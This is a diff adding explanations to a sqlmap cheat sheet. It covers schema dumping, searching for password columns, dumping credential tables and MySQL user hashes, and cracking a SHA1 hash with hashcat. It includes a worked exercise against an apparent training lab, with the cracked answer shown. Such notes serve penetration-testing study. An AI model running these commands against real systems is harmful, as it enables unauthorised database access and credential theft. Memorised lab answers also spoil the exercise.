@@ -11,8 +11,9 @@ sqlmap -u "TARGET" --schema
 # Skip noise from system DBs
 sqlmap -u "TARGET" --schema --exclude-sysdbs
 ```
+> Dumps the entire database schema in one shot. `--exclude-sysdbs` hides MySQL's built-in system databases so you only see application data. Useful for quickly mapping an unfamiliar target database. Replace `TARGET` with your target's URL.
 
-Returns column names and types — useful for spotting password/credential columns at a glance.
+The output shows column names and data types. This makes it easy to spot password and credential columns at a glance.
 
 ---
 
@@ -30,6 +31,7 @@ sqlmap -u "TARGET" --search -T user
 # Find columns matching a name
 sqlmap -u "TARGET" --search -C pass
 ```
+> LIKE-based search across all databases. Use `-C pass` to find columns named `password`, `passwd`, `passphrase`, etc. without knowing the exact database or table structure. Replace `TARGET` with your target's URL and the search term with what you're hunting for.
 
 > Search is case-insensitive and uses LIKE — `-C pass` matches `password`, `passwd`, `passphrase`, etc.
 
@@ -37,7 +39,7 @@ sqlmap -u "TARGET" --search -C pass
 
 ## Password Hash Cracking (built-in)
 
-When sqlmap detects a password-like column during `--dump`, it offers automatic cracking:
+When sqlmap detects a password-like column during `--dump`, it offers to crack the hashes automatically:
 
 ```
 [INFO] recognized possible password hashes in column 'password'
@@ -45,14 +47,15 @@ do you want to crack them via a dictionary-based attack? [Y/n/q] Y
 ```
 
 - 31 supported hash types (MD5, SHA1, SHA256, MySQL, bcrypt variants, etc.)
-- Built-in 1.4M password dictionary at `/usr/share/sqlmap/data/txt/wordlist.tx_`
-- Multi-process — uses all CPU cores
-- Option to use a custom dictionary or apply common suffixes (slow)
+- Built-in wordlist with 1.4 million passwords at `/usr/share/sqlmap/data/txt/wordlist.tx_`
+- Multi-process — uses all available CPU cores
+- Option to use a custom dictionary or apply common suffixes
 
 ```bash
 # Dump credentials table and auto-crack hashes
 sqlmap -u "TARGET" --dump -D mydb -T users
 ```
+> Dumps a specific table. When sqlmap detects password-like column content, it offers to crack the hashes automatically. Answer Y to let it try with its built-in 1.4M-entry dictionary. Replace `TARGET`, `mydb`, and `users` with your target's values.
 
 ---
 
@@ -63,6 +66,7 @@ Dumps DB-level user accounts (e.g., `mysql.user`) and offers to crack them:
 ```bash
 sqlmap -u "TARGET" --passwords --batch
 ```
+> Dumps MySQL system-level user password hashes from `mysql.user` and attempts to crack them. These are database authentication accounts (root, etc.), not application users. Replace `TARGET` with your target's URL.
 
 Output:
 ```
@@ -80,6 +84,7 @@ Output:
 ```bash
 sqlmap -u "TARGET" --all --batch
 ```
+> Full automated enumeration — dumps every database, table, column, and hash without any prompts. Use on full pentests with UNION injection. Avoid for CTFs or blind injection — it's extremely slow when each data byte requires multiple requests.
 
 `--all` + `--batch` performs full enumeration with no prompts:
 - All DBs, tables, columns dumped
@@ -102,6 +107,7 @@ sqlmap -u "http://154.57.164.72:30732/case1.php?id=1" \
   --dbms=mysql --batch --technique=U --no-cast \
   --search -C style
 ```
+> Searches all databases for columns containing "style" in their name. `--search -C` performs a LIKE search across `information_schema.columns`. Replace the IP, port, and search term for other targets.
 
 Only one match across all databases:
 ```
@@ -124,17 +130,19 @@ sqlmap -u "http://154.57.164.72:30732/case1.php?id=1" \
   -D testdb -T users -C name,password \
   --where="name LIKE 'Kimberly%'" --dump
 ```
+> Dumps only matching rows from a specific table. `-C name,password` limits to two columns. `--where=` applies a SQL WHERE condition so only Kimberly's row is retrieved. Replace the IP, port, database, table, columns, and WHERE condition for other targets.
 
 Result:
 ```
 | Kimberly Wright | d642ff0feca378666a8727947482f1a4702deba0 |
 ```
 
-Hash is SHA1. Either let sqlmap auto-crack (Y at the prompt) or use hashcat:
+The hash format is SHA1. Either let sqlmap crack it automatically by pressing Y at the prompt, or run hashcat yourself:
 ```bash
 echo "d642ff0feca378666a8727947482f1a4702deba0" > hash.txt
 hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
+> Cracks a SHA1 hash with hashcat. `-m 100` is the SHA1 mode. Replace the hash value and path with your target's values. Use `-m 0` for MD5 or `-m 300` for MySQL 4.1+ hashes.
 
 **Q2 Answer:** `Enizoom1609`
 
